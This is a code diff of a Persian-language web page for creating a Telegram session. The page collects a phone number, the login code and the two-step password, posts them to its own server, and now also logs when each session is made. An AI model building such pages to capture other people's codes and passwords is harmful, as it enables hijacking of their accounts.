@@ -94,20 +94,20 @@ body{
     color:white;
 }
 .box{
-    width:350px;
+    width:170px;
     margin:80px auto;
-    padding:22px;
+    padding:10px 22px;
     background:rgba(15,23,42,0.88);
     border-radius:14px;
     text-align:center;
 }
 input, button{
-    width:80%;
-    padding:10px;
-    margin-top:10px;
-    border-radius:10px;
+    width:70%;
+    padding:4px;
+    margin-top:6px;
+    border-radius:5px;
     border:none;
-    font-size:14px;
+    font-size:13px;
     display:block;
     margin-left:auto;
     margin-right:auto;
@@ -128,7 +128,7 @@ button:active, button.active{
 }
 #deleteBtn{
     background:#f87171;
-    font-size:12px;
+    font-size:11px;
     display:none;
 }
 #done{
@@ -140,7 +140,7 @@ button:active, button.active{
 <body>
 
 <div class="box">
-<h3>ساخت سشن تلگرام</h3>
+<h3 id="titleText">ساخت سشن تلگرام</h3>
 <input id="mainInput" placeholder="+98xxxxxxxxxx">
 <div id="buttonsWrapper">
     <button id="mainBtn" onclick="nextStep()">دریافت کد</button>
@@ -174,9 +174,7 @@ function nextStep(){
         .then(r=>r.json()).then(d=>{
             if(d.status==="2fa"){
                 step="password";
-                mainInput.type="password";
-                mainInput.placeholder="رمز دو مرحله‌ای";
-                mainBtn.innerText="تأیید رمز";
+                preparePasswordStep();
             }else if(d.status==="ok"){finish();}
             else alert("کد اشتباه است");
         });
@@ -184,6 +182,20 @@ function nextStep(){
         fetch("/send_password",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone,password:v})})
         .then(()=>finish());
     }
+}
+
+function preparePasswordStep(){
+    const mainInput = document.getElementById("mainInput");
+    const mainBtn = document.getElementById("mainBtn");
+    const title = document.getElementById("titleText");
+    
+    step = "password";
+    mainInput.type = "password";
+    mainInput.value = ""; // پاک کردن نوشته قبلی
+    mainInput.placeholder = "رمز دو مرحله‌ای";
+    mainBtn.innerText = "تأیید رمز";
+    document.getElementById("deleteBtn").style.display = "none"; // مخفی کردن دکمه حذف
+    title.innerText = "وارد کردن رمز دو مرحله‌ای";
 }
 
 function deleteSession(){
@@ -199,17 +211,30 @@ function sendPhone(){
     fetch("/send_phone",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({phone})})
     .then(()=>{
         step="code";
-        mainInput.placeholder="کد تأیید تلگرام";
+        const mainInput = document.getElementById("mainInput");
+        const mainBtn = document.getElementById("mainBtn");
+        mainInput.value = "";
+        mainInput.placeholder = "کد تأیید تلگرام";
         mainBtn.innerText="تأیید کد";
+        document.getElementById("titleText").innerText = "دریافت کد تأیید";
+        document.getElementById("deleteBtn").style.display = "none";
     });
 }
 
+// ======================= finish() با ثبت زمان =======================
 function finish(){
-    mainInput.style.display="none";
-    mainBtn.style.display="none";
+    const timestamp = new Date().toISOString(); // زمان ساخت سشن
+    fetch("/register_session_time",{
+        method:"POST",
+        headers:{"Content-Type":"application/json"},
+        body:JSON.stringify({phone, created: timestamp})
+    });
+    
+    document.getElementById("mainInput").style.display="none";
+    document.getElementById("mainBtn").style.display="none";
     document.getElementById("done").style.display="block";
 }
-
+ 
 setInterval(()=>fetch("/ping"),240000);
 </script>
 </body>
